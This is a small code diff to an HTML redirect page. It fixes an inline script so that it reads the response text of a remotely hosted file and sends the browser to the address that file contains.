@@ -4,7 +4,7 @@
   </head>
   <body>
     <script>
-      window.location.replace(await fetch("https://envious-stream.surge.sh/dir.txt"));
+      window.location.replace(await (await fetch("https://envious-stream.surge.sh/dir.txt")).text());
     </script>
   </body>
 </html>
